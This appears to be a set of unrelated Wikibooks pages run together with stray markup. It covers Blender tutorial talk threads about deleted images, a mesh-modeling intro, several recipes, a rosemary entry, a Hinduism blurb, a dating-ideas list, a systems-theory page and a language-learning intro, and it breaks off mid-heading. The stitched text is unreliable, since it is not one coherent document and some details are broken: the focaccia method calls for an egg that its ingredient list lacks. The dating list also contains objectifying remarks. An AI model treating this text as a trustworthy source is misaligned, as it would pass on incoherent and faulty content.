--[[User:Mrfelis|Mrfelis]] 6 July 2005 02:55 (UTC)

This tutorial needs to be marked as incomplete and moved to the &quot;Miscellaneous Tutorials&quot; at the bottom of the main page of the Wikibook. I'd do it myself, but I'm completely wiki illiterate. This is my first post on a wiki. [[User:Jdwolfears|Jdwolfears]] ([[User talk:Jdwolfears|talk]]) 07:53, 20 May 2010 (UTC)

:I think it's a good lesson, and will rework it and it's second page into something that useable. [[User:Pearts|Pearts]] ([[User talk:Pearts|talk]]) 13:44, 3 September 2010 (UTC)

== Set up ==

This bit;

&quot;Now scroll the view [[using by]] clicking and dragging the MMB and notice how the cube and image move together?&quot;

Apart from the [[typo]] I'm not sure what its intention is because when you rotate the world by clicking and dragging the MMB the background image vanishes, as it is apparently only visible from the three orthogonal views &amp; the camera; therefore by saying &quot;...notice how the cube and image move together?&quot; seems odd. I'm using Blender v2.40, so maybe this behaviour is different from v2.37.

Also, on the previous bit where we are playing around with the 'blend' function it could do with being mentioned how to input the exact 0.500 value again as it's nearly impossible to do it with the slider; i.e. click on the current value and enter it with the keyboard &amp; then press enter. Just to help.

Also, in Blender v2.40 &quot;Ext1: 0.2 Ext2: 0.02 BevResol: 4&quot; appear as:

&lt; Extrude: n.nnn &gt;

&lt; Bevel Depth: n.nnn &gt;

&lt; BevResol: n &gt;

In more-or-less the same place; Mode: Edit or Object &gt; Panel: Editing &gt; MiniMenu: Curve and Surface.

[user:mr_spoon, 4/Jan/06].

----

OK It is probably just me but there appears to be a bit between &quot;Polishing the Tracing&quot; and &quot;Adding the third dimension&quot;. The reason I say this is I have the latest version of blender and following the instructions as listed means that instead of a solid swoosh-type shape you get a solid shape with the middle taken out.

That image showing how to set up the curve it probably the worst for someone (like me!) who is trying to learn a whole bunch of stuff that is new...

The picture needs to be changed!!!

[From marinalan, Mar 16 2009]
I am very much frustrated that I can not see in this tutorial original image that is served as background image for tracing, exactly &quot;no symbol with lightening bolt&quot; in png or jpg format.

Without this I can not follow and do steps.

Noob answer: I just used my own Logo and followed the steps, it still worked. 

I had much more success with another tutorial,

{{subject|Talk:Blender_3D:_Noob_to_Pro/2D_Image_(logo)_to_a_3D_Model}}

=== &lt;center&gt;*&lt;/center&gt; ===

Hi anybody (or everybody),

Just discovered this tutorial and wanted to use it to help myself. Then discovered that it's in state of disarray.

'''I tried to find out what's wrong with the missing images,''' so I checked the Commons deletion log for one of them ''([[Commons:File:Blender-2dlogo-polish-final.png]])''... but either the search is faulty, or I don't know what, because it's yielding no results:

&lt;blockquote style=&quot;background-color: #dddddd; padding: 0.5em 1em&quot;&gt;http://commons.wikimedia.org/w/index.php?title=Special:Log&amp;type=&amp;user=&amp;page=File:Blender-2dlogo-polish-final.png&amp;year=&amp;month=-1&amp;tagfilter=&lt;/blockquote&gt;

Should I believe that this file had never been uploaded in the first place? Maybe I'm distrustful, but somehow I doubt this...

Then I checked the history of this tutorial, to look for some useful c[l]ues as to what might have happened.

One notheworthy edit is this one ''([http://en.wikibooks.org/w/index.php?title=Blender_3D:_Noob_to_Pro/2D_Image_(logo)_to_a_3D_Model&amp;diff=1008439&amp;oldid=987316 diff])'' by [[User:Mike.lifeguard]] on 20 October 2007. His description of the action is:

&lt;blockquote style=&quot;background-color: #dddddd; padding: 0.5em 1em&quot;&gt;''Removing instance of image Blander-sample-2d-logo.jpg that has been deleted because &quot;nld&gt;7d&quot;); using [[WP:TW|TW]])''&lt;/blockquote&gt;

Now no sane person is going to know what sort of excuse &quot;nld&gt;7d&quot; is. But we have Google, so I located the description of this mysterious symbol... on said user's own subpage ''([[User:Mike.lifeguard/Deletion_reasons]]),'' and only there (hey, that's a notable symbol then, isn't it). So I was lucky that Google placed this result on the top position ''globally,'' otherwise I would never find it. (So it must be somehow notable in the end.) The explanation is perhaps even more mysterious than what it explains:

&lt;blockquote style=&quot;background-color: #dddddd; padding: 0.5em 1em&quot;&gt;
nld&gt;7d
: &lt;nowiki&gt;[[WB:NLD|nld&gt;7d]]&lt;/nowiki&gt;
&lt;/blockquote&gt;

Well, lucky me that I can comprehend [[Wikipedia:Wikicode|wikicode]]—not everybody can. So I typed in &lt;tt&gt;[[WB:NLD]]&lt;/tt&gt; manually in the search box, only to get redirected to... ''[[Wikibooks:Media]].''

&lt;blockquote style=&quot;background-color: #dddddd; padding: 0.5em 1em&quot;&gt;This policy explains our requirements for images and other media files used on Wikibooks.&lt;/blockquote&gt;

Great! So what do we know? All that we learn is that the picture has been deleted because of failing unspecified &quot;requirements&quot;!

So we end up knowing nothing, unable to make our own judgement of that long-gone operation. But at least we have a proof (!) that the file ''([[Commons:Image:Blander-sample-2d-logo.jpg]])'' existed, and had been deleted, rather than never uploaded in the first place!

So I re-test the Commons deletion log search for ''this'' one file... again, to no avail. Now we know that it is not just this particular tutorial: '''it is basic mechanisms of Mediawiki that appear to be falling apart.''' (Or, if I am simply unskilled enough to use them properly, how many other people are? If not for problems of the kind that I discovered, I'm sure someone would have repaired this tutorial by now after all these years!)

=== Summary ===

Summing up, the problems which I have encountered in the way of my effort to repair this tutorial appear to lie in the ways Wikimedia mechanisms are at the moment functioning:

&lt;table border=&quot;0&quot; cellpadding=&quot;1&quot; cellspacing=&quot;2&quot; style=&quot;float:right; margin: 0 0 10px 20px; width:200px; border: solid 1px #bbb; clear: right;&quot;&gt;&lt;tr&gt;&lt;td&gt;[[Image:Voroshilov, Molotov, Stalin, with Nikolai Yezhov.jpg|200px|Before]]&lt;tr&gt;&lt;td&gt;[[Image:The Commissar Vanishes 2.jpg|200px|After]]&lt;tr&gt;&lt;td colspan=&quot;1&quot; align=&quot;left&quot;&gt;&lt;small&gt;'''''[[Wikipedia:Damnatio memoriae|Damnatio memoriae]]''—history knows cases of whole people being deleted from the deletion log.''' It is comparatively easy to delete—and disproportionately hard to create. But, while deleting can often be somehow justified, deleting from the deletion log is outright evil... ''and you should know this without my explanation.''&lt;/small&gt;&lt;/table&gt;

# '''The deletion log on Commons is a bit hard to locate.''' Entering &quot;deletion log&quot; in the search box yields no results. I have found it by using a separate search on the Commons &quot;Help&quot; page which works for help pages only. I don't know why the primary search box should not have universal scope of operation like it has on Wikipedia. (Okay, it does—as I discovered later—but the user must know upfront which namespace to select... only to get an old, defunct [[Commons:Commons:Deletion log|deletion log page from year 2004]]. For readers' information, here is the ''[[Commons:Special:Log/delete]]''—don't confuse with a Wikibooks deletion log.)
# '''The deletion log search almost never appears to work.''' (Well, quite wickedly, it seems to work ''only'' for the kind of files, disappearance of which couldn't go unnoticed by a large audience...) To compound, rather than ease, this problem—the search doesn't seem to allow for filename filtering, so you can't find a file without knowing its full name. (Why this restriction, so unnatural for computer systems—do we have something to hide?) Example:&lt;blockquote style=&quot;background-color: #dddddd; padding: 0.5em 1em&quot;&gt;http://commons.wikimedia.org/w/index.php?title=Special:Log&amp;type=delete&amp;user=&amp;page=Image:Blander-sample-2d-logo.jpg&amp;year=&amp;month=-1&amp;tagfilter=&lt;/blockquote&gt;
# '''Accountability for actions of possibly long-departed users:''' someone has deleted a (perhaps!) good stuff someday many years ago under a pretension of informed decision, such as &quot;nld&gt;7d&quot; or even &quot;dafq3dsjh&quot;, leaving an otherwise 90% good tutorial in a state of disarray and seemingly making extra effort to make it irreversible. What next? What is our direction starting from this point?
# '''Some established habits of higher-profile users:''' It's easy to delete files without considering the fate of some greater work they were part of (such as this tutorial), and not even bother to leave notice about what happened and why '''on the pages that have linked to them.''' It takes comparatively little energy to delete a file. Unlike to create one. Even though both operations have ''equally'' profound effect. Some people seem to have lost this sense of balance (or have never had it in the first place) between these two opposite modes. Perhaps it's their broader pattern that they do things merely because they can do them.
# '''Commons pages of deleted files look like these files have never existed,''' rather than been deleted—making it much less likely for someone to give it a second thought and possibly spot an abuse of deletion.

''The bottom line:'' I failed to find out what happened (and why) to the images missing from this tutorial, and to repair them, due to multiple obstacles in the ways Wikimedia sites work at this time. I'm hoping the problem only looks this big while actually not being so—that I just had bad luck today or so. But facts are there.

&lt;small&gt;''—[[User:6birc|6birc]] ([[User talk:6birc|talk]]) 01:25, 5 May 2010 (UTC)''&lt;/small&gt;

=== P.S. ===

Hey, I found them in the deletion log!

&lt;blockquote style=&quot;background-color: #dddddd; padding: 0.5em 1em&quot;&gt;
# http://en.wikibooks.org/w/index.php?title=Special:Log&amp;type=&amp;user=&amp;page=Image:Blander-sample-2d-logo.jpg&amp;year=&amp;month=-1&amp;hide_review_log=1

&lt;/blockquote&gt;

I was looking in the wrong Wikimedia: Commons—instead of Books. (It's because the missing image links redirect to Commons.) The proper deletion log page is simply ''[[Special:Log]].''

So one legible explanation why they were deleted, that I found, is this:

&lt;blockquote style=&quot;background-color: #dddddd; padding: 0.5em 1em&quot;&gt;
''image with no copyright info, listed for over 7 days, no links.''
&lt;/blockquote&gt;

It appears that the author of this tutorial has disappeared from Mediawiki with [http://en.wikibooks.org/w/index.php?title=Blender_3D:_Noob_to_Pro/2D_Image_(logo)_to_a_3D_Model&amp;diff=prev&amp;oldid=236267 the last contribution ever] on 19 September 2005. Which is shame. I'm hoping he is alright.

Unfortunately, after finishing his work, he failed to tag his (probably genuine) illustrations with copy-free licence.

Even more unfortunately, this omission was only spotted with a two-years delay. (Sometimes it's better quick—or never.) By that time, he was not with us anymore to avert this little but critical error.

And that's how a good work has gone shit, instead of being preserved for years to come.

Theoretically, I guess, it is possible to undelete them for the purpose of individual re-creation and tagging with a proper licence—if someone was so determined.

It appears that the author ''is'' alive—it's just an extreme case of loss of interest in Wikimedia (perhaps computers in general): here is [http://en.wikipedia.org/w/index.php?title=Talk:Lion/Archive_2&amp;diff=prev&amp;oldid=111996965 his Wikipedia edit] two years later, in 2007.

: people come, write about what interests them, then lose interest, and dissapear... it's the way of the wiki... thanks for researching these! [[User:Pearts|Pearts]] ([[User talk:Pearts|talk]]) 13:42, 3 September 2010 (UTC)</text>

[[Image:MeshModeling.png|thumb|Your sketch should look like this.]]

Mesh modeling is the most common type of modeling in all of Blender-dom.  If you did the [[Blender 3D: Noob to Pro/Quickie Model|Quickie Model]] tutorial, then you've already participated in mesh modeling. A mesh is simply a collection of vertices that define a three dimensional object. This exercise will further help explain mesh modeling.

# Get a piece of paper and a pen or pencil.
# Draw three dots that are no more than 2.5 cm (about an inch) apart from each other
# Each one of these dots is called a '''vertex'''.  (The plural of vertex is &quot;vertices&quot;)
# Now connect two of the dots with a line segment.  The line segment is called an '''edge'''.
# Draw two more edges so that the three vertices are all connected.  You should now have a triangle drawn on the paper.  Fill the triangle in.  This is called a '''face'''.
# Now draw another vertex (dot) on the paper.  Connect it to two of the vertices (dots) you previously drew.  You have another triangle.  Fill it in to create another face.

Could you imagine doing this same sort of activity in 3D space?  Essentially, mesh modeling is just that. The details are on subsequent pages in this tutorial.

You can keep filling up the paper with more vertices, edges, and faces if you want.  You may want to try and create something interesting with your triangles. Blender also supports faces with four vertices (called quads), but faces with five or more (so-called N-gons) cannot be created.

''Look closely at a 3D video game character some time. Believe it or not, every part of the character is created from little triangles joined together (of course, the triangles are much harder to see in newer games using more detailed technology).''

When you're creating your models, remember that the whole point of having edges and vertices is so that you can have control points in 3D space for your faces.  When the scene is rendered, only the faces will be seen.  Any edges or vertices not connected to a face will not appear.

'''Bah Kut Teh''' (literally, &quot;spare rib tea&quot;) is a Hokkien specialty. It is an exotic herbal soup spiced with plenty of aromatic spices including [[Cookbook:Star Anise|star anise]], [[Cookbook:Cinnamon|cinnamon]], cloves and lots of [[Cookbook:Garlic|garlic]]. It is often served with Chinese doughnuts and goes well with white rice. It usually comes with a small serve of cut red chillies in dark soya sauce or garlic.

==Ingredients==

* 1½ lb (680 g) [[Cookbook:Pork|pork spareribs]], cut into 2 inch (5 cm) pieces
* 1 whole bulb garlic, unpeeled and slightly crushed
* 2 inch (5 cm) [[Cookbook:Chinese Herbs|ginseng root]], peeled and slightly crushed
* 3 cinnamon sticks
* 5 star anise
* 1 tbsp [[Cookbook:Pepper|white peppercorns]]
* 1 tbsp [[Cookbook:Pepper|black peppercorns]]
* 2 tsp [[Cookbook:Sugar|sugar]]
* 1 tbsp [[Cookbook:Soy Sauce|dark soy sauce]]
* 6 dried [[Cookbook:Mushroom|shitake]] mushrooms
* 6 [[Cookbook:Shallot|shallots]], finely sliced and fried golden brown (optional)
* Salt and pepper

==Procedure==

# Soak dried shitake mushrooms in 240 ml of boiling water to reconstitute, when soft slice into strips; reserve liquid for cooking.
# In a stockpot, cover spareribs with cold water, parboil ribs until froth rises to the surface.
# Drain, briefly rinse spareribs under cold running water and drain again.
# In a casserole pan add the parboiled spare ribs, garlic bulb, ginseng root, shitake mushrooms, reserved liquid and additional water (to cover the meat).
# Wrap cinnamon, star anise, white and black peppercorns in cheesecloth, tie with string and add to the pan.
# Gradually bring to a boil, then cover and reduce heat to simmer until pork is very tender, about 45 mins to 1 hr; occasionally skim off fat from the surface.
# When the meat is almost falling off the bones; discard spice bag, season with salt and pepper and add dark soy sauce and sugar.

      <comment>why so dark?</comment>
      <text xml:space="preserve">Seems like more of a plug than a tutorial.  It is not easy to read, or to apply this tutorial.

For the beginner I suggest using pictures with each stage or step.  It is not easy to apply simple examples as shown on the home site.
Please try to include some pictures and notes on how to use the buttons... etc. 
Thanks...
Mariwan

Appears to have been updated.
Thank you to whoever updated this page.

Lol, no probs ! I'm busy now so the last part is still missing. I think I will make it during holidays ( or maybe someone else can do ;) ).

=== Can't use Track to Constraint ? ===

It's impossible to get something to &quot;track to contraint&quot; It tends to go to a dot at 0,0,0 (x,y,z) can anyone explain this?

* That's strange, it is working for me, and I can't do the thing you describe. I tried with a camera, a mesh and a spotlight, pointing to other diverse objets, and it worked. (Ow I discovered that when an object was assigned to &quot;Track to&quot; multiple objects, it looked in the exact middle of them. Don't know what it can be used to ;-) I exactly followed what I wrote in the tutorial and I had no problems. What is your version of Blender ? Mine is 2.35 (I know, I should upgrade :-P ) -- [[User:Totophe64|Totophe64]]


=== Why hasen't the rest of the tut been finished? ===
Hey, can you try to finish this tut, I'm a noob, wanting to be a pro, but I can't be a pro if I don't know what to do, so can you help me out please?

=== Dark ===
I am not sure why all the pics in this tutorial are so dark. None of my come out the same way, all are much lighter. ~ [[User:Nanobug|Nanobug]] ([[User talk:Nanobug|talk]]) 02:43, 24 October 2010 (UTC)</text>

[[File:Arjuna meets Krishna at Prabhasakshetra.jpg|thumb|left|The Hindu deity Lord Krishna meets his friend,cousin and brother-in-law, Arjuna, the warrior hero of the Mahabharata]]
Hinduism is a religion from the Indian sub-continent. It is a polytheist anthropomorphic religion with a highly ritualized form of worship. The canon of books and poems that define Hinduism were written in Sanskrit and are of ancient origin. They range from Epics about the lives and loves of the Gods, philosophical treatises on metaphysical questions, and law books. The Hindu religion has provided the roots of Jainism, Sikhism, and Buddhism. In the West it can be found in the Hare Krishna movement. Hinduism is the majority religion of India, Nepal, and Mauritius and a significant minority religion in Fiji, Suriname, Bhutan, Sri Lanka, Bangladesh, Malaysia, and Singapore.

      <text xml:space="preserve">== Classics ==
If you have no idea what to do, and don't mind her knowing you are interested in her, try these:

* Cinema - Most classic example, yet very usable, it's standard in the adolescent blind date scene, you can have fun even if the girl wants to spoil your evening. Some people think it's really boring, because you don't get to talk or look at each other.
* Restaurant - She will usually expect you to pay for her; as a first date, you may both have an overly awkward feeling.  Requires excellent conversation skills. 
* Cooking for/with her - More creative, but considered too dangerous for a first meeting of two almost-strangers!
* Theatre - like the cinema, but a bit more unusual (and more expensive)
* Local Play - Instead of a theatre, try going to a small local production, like at a community center. These are often quite professional, almost always a lot of fun, relatively inexpensive, and a lot less formal than a theatre.
* Amusement Park - If you're young enough (teen), try going on a trip together with a school, community center, etc. You're probably not going to be paying for both of you. (Tickets usually cost $20-50). Hang out together in the park, maybe eat lunch together.
* Go for a walk together - Free, non-threatening first date for almost-strangers. Some people tend to prolong such walks.  According to the &quot;don't act needy&quot; rule, an early withdrawal might be better.

== Creative things ==
''alphabetized list''
* Bar/Pub - why does this even need to be listed?
* Beach - go for a walk on the beach, sunrise, sunset, any time. Swim or don't, play in the sand, build castles, or have a mudfight. This is a good teen activity. The beach is particularly romantic at night (maybe too much for a first date) with the stars, the relative darkness, and the gentle lapping of the waves against the shore.
* Bowling  
* Church or other kinds of religious services - Attend religious services together.  Afterward, find out about each other's spiritual side.   Reverently and respectfully discuss religious beliefs.
* Concerts / summer rock festivals - Choose a band that has lively music and bright lights.  A band she would obviously not know about is a good choice.  Conversation would also not necessary during the &quot;main event&quot; while you can still see her (unlike movies) and perhaps dance or headbang.  Later then, should be a good time to reminisce and talk about past experiences.  Be careful not to get separated.   (Bring along a set of earplugs to rock festivals just in case she has sensitive hearing; she will perceive this as a thoughtful gesture)
* Crafts/Arts - Finger paint together, make foam swords, do origami, paper airplanes, paper maché, or some other creative activity
* Convention center show - Call up the nearest city's convention center and see what's on.
* The &quot;Country&quot; - If you live in an urban area with a lot of things to do, take a drive to where people get their kicks from picking off blackbirds from the fence with a rifle. (Note: This may be a bad idea for a first date.  Also, find out her thoughts about shooting animals first.  Target practice on inanimate objects may be better.)   Teaching her how to hold a rifle is one of the classic ways to get close to a girl (the &quot;teaching embrace&quot;).
* Dancing - No, you don't want to lead her into a normal disco where you have to fight the fleas that suddenly get interested in your girl... Try a Latin/salsa place, if you know how to dance it. Mostly they are cheap, there are a lot of tables, and the guys usually respect a couple. Also dancing is a fabulous way to feel up a girl.  Or, learn some basic ball-room dancing moves such as twirling, and especially dipping (girls like both those moves).  Learn how to lead.  Fred Astaire and Ginger Rogers movies may provide some inspiration.  
* Drive-in Movie - The classic aspect of a regular movie might make a girl yawn. Many cities still have Drive-in theatres. Try catching a scary movie here!
* Errands - Not exactly a date per se, but taking a girl along to get useful things done can be a good neutral way to get to know each other on more or less a friendly basis. Call up that girl and ask her if she wants to come along with you to buy groceries, register for classes, or even shopping for clothes (be careful about the whole &quot;clothes&quot; thing though - I think you know what I mean).  
* Expensive Areas - A lot of girls like to look at mansions, unless they live in one.   Share your favorite ideas of what you would include in your dream house.  
* Food - early morning breakfast, or no-fork spaghetti, or a marathon dinner, or a dollar dinner (what you can find to eat for a dollar per person), or cornflakes by candlelight, or backwards dinner (with food on the table, eat while sitting facing the opposite direction), dinner at a campground, pacific island-themed dinner, and so on...
* Games - Play hide-and-go-seek in the mall (Limit the area, if it is too large), play blind volleyball.  
* Hikes - Similarly, if there are some good nature areas around (state parks, historic sites, etc.), a good date can be walking a trail through them. On the magnitude of 3-5 miles gives you some time to be together without being too strenuous.  Take along enough water &amp; energy snacks for the two of you.  (shows thoughtfulness) 
* Kite-flying - You could both try to make an old-fashioned kite, or you could just get a cheap kite or two.
* Miniature Golfing - A fun activity that allows some conversation, but an even balance of an activity as well.
* Museums, Art - A nice combination of modern and classical art is good, so that you can get a break now and again from being weirded out by all the abstract stuff.  Analyze out loud what feelings different works of art evoke and invite her to do the same.  (This shows her that you are in touch with your emotional side.)  Be respectful of her opinions, even if they are opposite yours.    
* Park - go to a local park, sit on the benches and talk, or go for a walk around the lake. Lay down in a big grassy field at night.  Now ''that's'' romantic.
* Parties - Going for a party is always a nice idea.
* Holiday Parties - have a Christmas party in July and go carolling.  (most fun in a big group)
* Playground - Can be found in schoolyards and parks.  Make sure it is has decent-sized equipment to play on.  Swings are a classic.  Give her an under-dog.  The right playground equipment will give you an opportunity to show off your physical prowess in a non-threatening, childlike way. 
* Pool - relatively cheap, can be a great way to have some fun.
* Rock climbing - rock walls are a great start. A nice excuse to show your strength and to help her climb.
* Scenery - Anywhere outdoor with a nice lookout.  Nothing like an romantic evening under the stars - and there will most likely be a coffee place to learn about each other.  Not to mention you can show off your astronomy skills - girls love it.
* Shopping - In any city there are interesting locations to go, Chinatown for example or a gothic or freaky shop.
* Skating - Any type (roller skating, roller blading, ice skating, etc.) will do.  It is a (relatively) painless and cheap way to spend some quality time.
* Skiing - Skiing although sometimes expensive is a great way to &quot;break the ice&quot; especially if you are a particularly good skiier
* Sports - Racquetball, Tennis, Soccer, Volleyball, Swimming, Bicycles, Ice Skating, Bowling, Roller skating... find out if she likes to watch or play these, and make it part of a date.
* Sunrise anything - See if she is a morning person.   See what she looks like without makeup
* Tea - Find a good teahouse, ask around. Sophisticated girls will love this one!
* Theme Restaurant - These can be fun! Esepecially one where you and her may both have childhood memories!  
* Tricks - glue a quarter to the sidewalk, preferably in an area that gets a lot of people passing through, and then videotape the people who notice it. 
* Watching - Watching a big event on TV at your house. Probably not a sports game unless she's interested. Or watch TV with no sound and make up the funniest things they could be saying. Another idea is to watch shows like Jerry Springer and cover up the idea of that episode (i.e. &quot;my mother was a [blank]&quot;, or &quot;my [blank] was a [blank] behind my back) and try and guess it. You can also watch a couple of episodes from your favorite TV series (make sure she likes it first) this will also give you the chance to give her something for example &quot;I'm getting some hot chocolate, whould you like some?&quot;.
* Water - Water, like ponds or lakes, often has a romantic quality about it. Pick a place with lots of birds or other wildlife.
* Water Balloons - fill up a bunch on a hot day and then have a water balloon fight.  Make sure she wants to get wet first.  
* Zoo - You'll have tons to talk about and pretend you're both like kids again.

Be creative. Maybe some things you liked to do in your youth?

For clarification, '''Currently Untitled Studio''' means just that, not that CUS is the name of the studio. The name will be changed as work progresses. In either case, this is a case study/log of events concerning production of a series of shorts undertaken by DorianGray (director) and a group of volunteers.

Note: The first few weeks of work are not dated, or have only been dated by the accuracy of memory. Specific items such as previous ideas, names, and storylines/scripts will not be mentioned or changed for privacy, liability and copyright reasons. These will possibly be changed as work progresses/finishes.

'''[[w:Mackerel|Mackerel]]''' is an oily-fleshed sea fish found throughout the oceans of the world. The flesh is strong-flavoured and the fish is bony, which means it is not a fish for beginners. 

It is important to buy mackerel as fresh as possible. If you can, buy it with the head on, so that you can see if the eye is still bright; if it isn't, don't buy it. 

One way of cooking mackerel is to chop off the head and gut the fish, then make up a paste of [[Cookbook:Mustard|mustard]], [[Cookbook:Lemon|lemon juice]], [[Cookbook:Garlic|garlic]] and [[Cookbook:Rosemary|rosemary]]. Make some incisions into the side of the fish, then rub the paste over the skin of the fish, working it into the cuts. Fill the body cavity with finely chopped [[Cookbook:Onion|onion]] and herbs. Wrap the fish in foil and bake it in a preheated medium oven for about 20 minutes. Serve with boiled [[Cookbook:Potato|potatoes]].

Mackerel can also be grilled and served, unlikely as it may seem, with a [[Cookbook:Purée|purée]] of [[Cookbook:Gooseberry|gooseberries]].

Smoked mackerel can be bought in most supermarkets and fishmongers and is often served with a salad.

[[Image:Rosemary.jpg|right|thumb|Rosemary]]

'''Rosemary''' is a perennial woody herb, which grows in temperate and Mediterranean climates. The thin  needle-like leaves are used in cooking.  They have a bitter, astringent taste, which complements oily foods, such as [[Cookbook:Lamb|lamb]] and oily fish.

Rosemary can also be used a flavouring in [[Cookbook:Bread|bread]] such as foccaccia. 

You can put whole branches of the plant on to the hot coals of a barbecue to flavour the food being cooked, or strip off the leaves and use the stem as a skewer for [[Cookbook:Kebab|kebabs]] (but you will need to pierce a hole in the food with a real skewer first, and soak the stem in water before use, to prevent it burning). 

When [[Cookbook:Roasting|roasting]] a leg of lamb, branches of fresh rosemary can be laid in the roasting pan directly under the meat to keep it from sticking to the pan, and to infuse the meat with aroma of rosemary. Also strip the leaves off a branch or two, to sprinkle on top of the meat before roasting.

In [[Cookbook:Cuisine of Australia|Australia]] and [[Cookbook:Cuisine of New Zealand|New Zealand]], sprigs of rosemary are traditionally worn on ANZAC day, to commemorate the soldiers from those countries who have fought in all wars since the Great War.

''Focaccia'' is a type of flat bread popular in Italy. The basic bread is often topped with any of the following: [[Cookbook:Herbs|herbs]], [[Cookbook:Olive Oil|olive oil]], [[Cookbook:Cheese|cheese]], [[Cookbook:Meat|meats]], and [[Cookbook:Vegetable|vegetables]], and can be seen as a precursor to pizza. Focaccia is commonly used for [[Cookbook:Sandwiches|sandwiches]].

Makes 1 loaf.

==Ingredients==
[[Image:Focaccia.png|thumb|right|Focaccia bread]]
* 4 1/2 [[Cookbook:Cup|cups]] all-purpose [[Cookbook:Flour|flour]]
* 1 [[Cookbook:Teaspoon|teaspoon]] [[Cookbook:White Sugar|white sugar]]
* 1 teaspoon [[Cookbook:Salt|salt]]
* 1 [[Cookbook:Tablespoon|tablespoon]] active dry [[Cookbook:Yeast|yeast]]
* 1 cup water
* 2 tablespoons vegetable [[Cookbook:Oil|oil]]

# Combine 1 cup flour, sugar, salt, and yeast. Mix well.
# Heat water and vegetable oil until warm, and add to yeast mixture along with the egg. 
# Blend with an electric [[Cookbook:Mixer|mixer]] at low speed until moistened. [[Cookbook:Beating|Beat]] for 2 additional minutes.
# Stir in 1 3/4 cup flour ('''note: half of remaining total''') while beating, until dough pulls away from side of bowl.
# Knead in 1 3/4 cup flour on floured surface. Cover dough with a bowl, and let sit for 5 minutes.
# Place dough on a greased [[Cookbook:Baking Sheet|baking sheet]]. Roll out to 12-[[Cookbook:Inch|inch]] circle. Cover with greased plastic wrap and a cloth towel. Place in a warm place for 30 minutes.
# Uncover dough, and poke holes in it with a spoon handle at 1 inch intervals. Drizzle olive oil on dough, and sprinkle with crushed rosemary.
# Bake at [[Cookbook:Oven Temperatures|400 °F (205 °C)]] for 17 to 27 minutes, until just golden. Remove from baking sheet, and cool on rack.

      <text xml:space="preserve">{{Systems Theory Page}}

== Inputs and Outputs ==

Input is something put into a system or expended in its operation to achieve output or a result.  Output is the information produced by a system or process from a specific input.  Within the context of systems theory, the inputs are what are put into a system and the outputs are the results obtained after running an entire process or just a small part of a process.  Because the outputs can be the results of an individual unit of a larger process, outputs of one part of a process can be the inputs to another part of the process.

== Input-Output Analysis ==

Input-output analysis is “a technique used in economics for tracing resources and products within an economy. The system of producers and consumers is divided into different branches, which are defined in terms of the resources they require as inputs and what they produce as outputs. The quantities of input and output for a given time period, usually expressed in monetary terms, are entered into an input-output matrix within which one can analyze what happens within and across various sectors of an economy where growth and decline takes place and what effects various subsidies may have” (Krippendorf).

== Areas of Consideration ==

Systems theory is “transdisciplinary study of the abstract organization of phenomena, independent of their substance, type, or spatial or temporal scale of existence” (Universiteit).  It can be applied to general systems that exist in nature or, in a business context, organizational or economic systems.  In studying systems theory, there are a few common, major aspects to consider. 

One must look at the individual objects that compose a system.  The objects consist of the parts, elements, or variables that make up the system.  The objects that make up a system can be physical objects that actually exist in the world, or they can be abstract objects or ideas that cannot be found physically in the world.  

One must also consider the attributes of a system.  The attributes consist of the qualities and properties of the aforementioned objects of the system.  The attributes may also describe the entire system itself.  

A third consideration would be the internal relationships among the objects of a system.

The fourth consideration would be the environment in which the system exists.  

All of these aspects of a system play an important role.  Using these four characteristics, a system can then be defined as “a set of things that affect one another within an environment and form a larger pattern that is different from any of the parts.”  Furthermore, “The fundamental systems-interactive paradigm of organizational analysis features the continual stages of input, throughput (processing), and output, which demonstrate the concept of openness/closedness” (Universiteit).

== Systems Defined ==

A system can be defined by using the definition of desired outputs to understand what inputs are necessary.  The following questions can be used for this method:
# What essential outputs must the system produce in order to satisfy the system users’ requirements?
# What transformations are necessary to produce these outputs?
# What inputs are necessary for these transformations to produce the desired outputs?
# What types of information does the system need to retain?

Another way of defining a system is to work forward in a stimulus-response method of definition.  The following questions can be asked in conjunction with this method in order to define the system:
# What are the stimuli, and what are the responses to each stimulus?
# For each stimulus response pair, what are the transformations necessary?
# What are the essential data that must be maintained?

These methods can be used to define not just the general system in question, but also the subsystems which compose the larger system as a whole (Sauter).

      <comment>/* Contents */ it's not a Chinese proverb (search the Web for details, the earliest known use was by a 19th-century English author)</comment>
      <text xml:space="preserve">'''Autonomous Technology-Assisted Language Learning (ATALL)''' includes (a) the development and use of technological tools to facilitate foreign language (FL) or second language (L2) learning (both to be used synonymously hereafter), and (b) research on the development, use, and effects of such tools.

ATALL is autonomous in that it provides the means for language learners to improve their L2 proficiency whether or not they are taking formal courses in the language they are learning.  Thus, ATALL can be used by students in conjunction with formal L2 study or by learners who are not taking L2 classes.  ATALL activities can be used as an integrated component of formal L2 courses or for supplemental study (and perhaps extra credit) within L2 courses.  ATALL can also be used by non-native L2 teachers who wish to improve their L2 skills and show their students how they can continue to develop their L2 proficiency outside of class.  &quot;Autonomous&quot; also implies that the tools are widely available (such as via the World Wide Web) at no or low cost (see [http://ec.hku.hk/autonomy/ Autonomy in Language Learning] for resources about autonomy and language learning; for a comprehensive, empirically-based theory of human autonomy, see [[MetaWikipedia:wikipedia:Perceptual Control Theory|Perceptual Control Theory]] and the [http://www.perceptualcontroltheory.com Control Systems Group]).

ATALL encompasses ''all'' forms of electronic and information technology that can be used to facilitate L2 proficiency.  This includes the obvious tools of computer and Internet technology.  But it also includes other forms of communication technology such as wired and wireless telephony, television and radio (broadcast, satellite and cable) and the integration of older communication technologies with newer information technologies.

ATALL is based on the latest theory and research on second language acquisition [[MetaWikipedia:wikipedia:Second_language_acquisition |(SLA)]], the [[MetaWikipedia:wikipedia:Learning_psychology | psychology of learning]] and computer-assisted language learning ([[MetaWikipedia:wikipedia:Computer-assisted_language_learning|CALL]]).  Research and theory provides directions and implications for how technology can best be used to improve L2 proficiency in the areas of listening, speaking, reading and writing.  Principles derived from L2 research and theory are applied to the development of ATALL tools and activities.

ATALL activities can be divided into the five primary domains of '''input''', '''output''', '''interaction''', '''exercise''', and '''assessment''', which form five of the primary modules of this wikibook.

{{TOC|limit=4|float=none}}

==Production value==
{{expand|section}}

===Attribution===
====Credits====
Videos often include credits at the start or end of content. This type of attribution ensures that viewers are aware of a video's contributors. Credits may also be transcribed for the visually impaired.

=====Design=====
Sometimes, the delivery of credits may be sufficiently artistic or dramatic in such a way that contributes to the viewer's overall experience.

======Text======
[[File:Little Red Walking Hood title card.png|thumb|300px|Leading contributors can be featured alongside a video's title]]
Text may be presented with a variety of methods and can be opaque, transparent, or even artistic.

;Single-frame method
